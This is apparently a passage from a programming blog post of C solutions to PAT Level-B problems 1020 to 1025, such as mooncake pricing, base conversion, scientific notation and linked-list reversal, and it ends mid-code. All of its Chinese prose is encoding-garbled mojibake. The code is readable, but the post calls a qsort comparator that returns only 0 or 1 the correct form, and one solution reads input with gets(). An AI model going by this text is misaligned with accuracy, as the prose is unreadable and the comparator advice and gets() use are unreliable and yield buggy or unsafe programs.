æœˆé¥¼</h3><p>ä¸ºä»€ä¹ˆåšPTAçš„é¢˜æ€»æ˜¯å¾ˆæ°”ã€‚ã€‚è¿™ä¸ªé¢˜ç¬¬ä¸€ä¸ªæµ‹è¯•ç‚¹ç£¨äº†æˆ‘2ä¸ªå°æ—¶ï¼Ÿï¼Ÿï¼Ÿå…¶å®ä¹Ÿä¸æ€ªé¢˜ï¼Œåªæ˜¯å¾ˆå¤šé¢˜éƒ½è€ƒåˆ°äº†æˆ‘æ²¡æ³¨æ„è¿‡çš„å°ç»†èŠ‚ã€‚ã€‚é‚£ä¹Ÿæ˜¯æ”¶è·ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200706111934207.png" alt="image-20200706111934207"></p><p>æˆ‘å¡äº†2å°æ—¶çš„ä¸€ä¸ªæµ‹è¯•ç‚¹ï¼Œé”™è¯¯ï¼šqsortçš„æ¯”è¾ƒå‡½æ•°çš„è¿”å›å€¼æ˜¯intï¼Œè¿™æ¬¡é¢˜ç›®çš„æ•°æ®æ˜¯æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥å¦‚æœå½“ä¸¤ä¸ªæµ®ç‚¹æ•°ç›¸å·®å°äº1çš„æ—¶å€™ï¼Œè¿”å›çš„å€¼ä¸ºå˜æˆintå‹çš„0ï¼Œé‚£å°±ä¸ä¼šå‘ç”Ÿæ’åºäº†ã€‚å³æˆ‘ç”¨çš„<code>return q-&gt;price_single - p-&gt;price_single;</code>ï¼Œå½“ä»–ä»¬2ä¸ªæ•°ç›¸å·®å°äº1å°±è¿”å›0ï¼Œå¯¼è‡´ç»“æœæ˜¯ä¸æ’åºã€‚è¿™é‡Œæ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯<code>return q-&gt;price_single &gt; p-&gt;price_single;</code>ï¼Œä»¥åéƒ½å†™å¤§äºå°äºäº†ã€‚</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">double</span> ku, price_all, price_single;</span><br><span class="line">&#125;Cake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> Cake *a, <span class="keyword">const</span> Cake *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> b-&gt;price_single &gt; a-&gt;price_single;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cake cake[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">double</span> ans = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, demand = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;demand);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;cake[i].ku);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;cake[i].price_all);</span><br><span class="line">cake[i].price_single = cake[i].price_all/cake[i].ku;</span><br><span class="line">&#125;</span><br><span class="line">qsort(cake, n, <span class="keyword">sizeof</span>(Cake), cmp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(cake[i].ku &lt;= demand)</span><br><span class="line">&#123;</span><br><span class="line">ans += cake[i].price_all;</span><br><span class="line">demand -= cake[i].ku;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ans += cake[i].price_single*demand;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼š1.æˆ‘æ„Ÿè§‰è¿™ä¸ªçš„éš¾ç‚¹æ˜¯èƒ½ä¸èƒ½æƒ³åˆ°æ„é€ ç»“æ„ä½“ã€‚2.å¯¹æ•°æ®ä¸æ•æ„Ÿï¼Œä¸€ç›´è¢«å‘åœ¨qsortçš„æ¯”è¾ƒå‡½æ•°ã€‚</strong></p><h3 id="1022-Dè¿›åˆ¶çš„A-B"><a href="#1022-Dè¿›åˆ¶çš„A-B" class="headerlink" title="1022 Dè¿›åˆ¶çš„A+B"></a>1022 Dè¿›åˆ¶çš„A+B</h3><p>å°±æ˜¯è®©å†™ä¸€ä¸ª10è¿›åˆ¶æ•°è½¬ä»»æ„æŒ‡å®šçš„è¿›åˆ¶æ•°ï¼Œä»¥å‰æ¥è§¦è¿‡ï¼Œè¿™é‡Œå†™2ç§æ–¹æ³•ã€‚é€’å½’ä¸éé€’å½’ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200707124904891.png" alt="image-20200707124904891"></p><p>æ³¨é‡Šäº†çš„ä¸ºé€’å½’å†™æ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*void trans(int n, int d) </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">int ans = n%d;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(n &gt;= d)</span></span><br><span class="line"><span class="comment">trans(n/d, d);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf("%c", s[ans]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, d = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s1[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a, &amp;b, &amp;d);</span><br><span class="line">    <span class="comment">//trans(a+b, d);</span></span><br><span class="line"><span class="keyword">for</span>(c = a+b; c; s1[i++] = c%d, c /= d);</span><br><span class="line"><span class="keyword">if</span>(!i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0"</span>); </span><br><span class="line"><span class="keyword">while</span>(--i &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[s1[i]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1023-ç»„ä¸ªæœ€å°æ•°"><a href="#1023-ç»„ä¸ªæœ€å°æ•°" class="headerlink" title="1023 ç»„ä¸ªæœ€å°æ•°"></a>1023 ç»„ä¸ªæœ€å°æ•°</h3><p>æ¢ä¸ªç®—æ³•ï¼Œ åšå¯¹äº†ã€‚ä½†ä¸€ç›´æƒ³ä¸é€šä¹‹å‰çš„ç®—æ³•ä¸ºä»€ä¹ˆæœ‰2ä¸ªæµ‹è¯•ç‚¹è¿‡ä¸äº†ï¼ŒæŠ˜ç£¨äº†æˆ‘å·®ä¸å¤šä¸€å¤©ã€‚ã€‚ã€‚æ‰¾é”™çœŸçš„å¥½éš¾ï¼Œåæ§½ä¸€ä¸‹PATä¸ºä»€ä¹ˆä¸ç»™å‡ºæµ‹è¯•ç‚¹ã€‚</p><p><strong>é”™è¯¯ï¼šæˆ‘ç”¨å­—ç¬¦è¡¨ç¤ºæ•´æ•°æ—¶æ˜¯è¦ASCII-48ï¼Œä½†æˆ‘åªè€ƒè™‘åˆ°äº†0-9çš„æƒ…å†µï¼Œå½“æ•°å­—å¤§äº9åå°±ä¸èƒ½ç›´æ¥å‡å»48äº†ï¼Œå¹¶ä¸”ä¼šè¢«å½“ä½œ2ä¸ªå­—ç¬¦å¤„ç†ã€‚</strong></p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200707222301486.png" alt="image-20200707222301486"></p><p>è¿™é‡Œå…ˆç»™å‡ºç®€å•çš„ä»£ç ï¼šå°±æ˜¯å…ˆæ‰¾åˆ°ç¬¬ä¸€ä¸ªé0æ•°å…ˆè¾“å‡ºï¼Œå†å°†å…¶ä¸ªæ•°å‡ä¸€ï¼Œæœ€åè¾“å‡ºæ‰€æœ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>], i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, i);</span><br><span class="line">a[i]--;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="keyword">while</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, i);</span><br><span class="line">a[i]--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ˜ç£¨æˆ‘çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">150</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>, ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((ch = getchar()) != <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ch != <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">ch -= <span class="number">48</span>; <span class="comment">//è¿™é‡Œåªæ»¡è¶³0-9çš„æƒ…å†µï¼Œæ‰¾è¿™ä¸ªé”™ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="keyword">while</span>(ch--)</span><br><span class="line">s[i++] = j+<span class="number">48</span>;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(s[i++] == <span class="number">48</span>);</span><br><span class="line">ch = s[i<span class="number">-1</span>];</span><br><span class="line">s[i<span class="number">-1</span>] = s[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">0</span>] = ch;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//æ­£ç¡®å†™æ³•ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">150</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">10</span>)</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">while</span>(ch--)</span><br><span class="line">s[i++] = j+<span class="number">48</span>;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(s[i++] == <span class="number">48</span>);</span><br><span class="line">ch = s[i<span class="number">-1</span>];</span><br><span class="line">s[i<span class="number">-1</span>] = s[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">0</span>] = ch;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šæ‰¾åˆ°é”™åï¼Œèˆ’æœäº†ã€‚</p><h3 id="1024-ç§‘å­¦è®¡æ•°æ³•"><a href="#1024-ç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="1024 ç§‘å­¦è®¡æ•°æ³•"></a>1024 ç§‘å­¦è®¡æ•°æ³•</h3><p>å†™èµ·æ¥æœ‰ç‚¹å°éº»çƒ¦ï¼Œè¿˜æ˜¯æ€ç»´æ–¹æ³•ä¸åˆ°ä½çš„åŸå› ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200708162556690.png" alt="image-20200708162556690"></p><p>åœ¨æŒ‡æ•°ä¸ºæ­£çš„æ—¶å€™èŠ±äº†äº›æ—¶é—´ï¼Œå“ªé‡Œä»å°æ•°ç‚¹åæœ‰å‡ ä½æ•°æœ‰æ•ˆæ•°å­—åˆ†æƒ…å†µçš„è¯ï¼Œæ¡ç†å°±ä¼šæ¸…æ¥šå¾ˆå¤šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">'-'</span>)</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(s[i++] != <span class="string">'E'</span>);</span><br><span class="line">n = atoi(s+i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n+<span class="number">1</span>; j++)</span><br><span class="line">ans[j] = j == <span class="number">1</span> ? <span class="string">'.'</span>:<span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; i<span class="number">-4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; j &lt; n+<span class="number">1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">ans[j++] = <span class="string">'.'</span>;</span><br><span class="line"><span class="keyword">for</span>( ; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; n-(i<span class="number">-4</span>); k++)</span><br><span class="line">ans[j++] = <span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'-'</span>);</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šè®°ä½ atoi()å‡½æ•°æ˜¯å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•°ï¼Œä¸å¦å¤–ä¸€ä¸ªç›¸å¯¹çš„å‡½æ•°æ€»æ˜¯è®°æ··ã€‚</strong></p><h3 id="1025-åè½¬é“¾è¡¨"><a href="#1025-åè½¬é“¾è¡¨" class="headerlink" title="1025 åè½¬é“¾è¡¨"></a>1025 åè½¬é“¾è¡¨</h3><p>å‘ç°å¯¹äºæˆ‘ç°åœ¨çš„æ°´å¹³ï¼Œåšä¹™çº§çš„éš¾é¢˜è¿˜è¦ç£¨åˆç£¨åˆã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200709104151427.png" alt="image-20200709104151427"></p><p>é¦–å…ˆç”¨ä¸€ä¸ªç»“æ„ä½“ä»£è¡¨æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®ï¼Œå…ˆå‚¨å­˜åœ¨ä¸€ä¸ªæ•°ç»„ã€‚ç„¶åæ ¹æ®çš„èŠ‚ç‚¹nextå…³ç³»ä½¿ç”¨é€‰æ‹©æ’åºå¯¹èŠ‚ç‚¹è¿›è¡Œæ’åºï¼Œæœ€ååè½¬ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> addr, data, next;</span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List temp = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> next = <span class="number">0</span>, n = <span class="number">0</span>, k = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;next, &amp;n, &amp;k);</span><br><span class="line">List *<span class="built_in">list</span> = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List)*n);</span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">list</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(List)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;<span class="built_in">list</span>[i].addr, &amp;<span class="built_in">list</span>[i].data, &amp;<span class="built_in">list</span>[i].next);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">list</span>[j].addr == next)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">list</span>[j];</span><br><span class="line"><span class="built_in">list</span>[j] = <span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">list</span>[i] = temp;</span><br><span class="line"></span><br><span class="line">next = <span class="built_in">list</span>[i].next;</span><br><span class="line"><span class="keyword">if</span>(next == <span class="number">-1</span>)</span><br><span class="line">n = i+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i += k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> l = i, r = i+k<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(r &gt;= n)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">while</span>(l &lt; r)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">list</span>[l];</span><br><span class="line"><span class="built_in">list</span>[l] = <span class="built_in">list</span>[r];</span><br><span class="line"><span 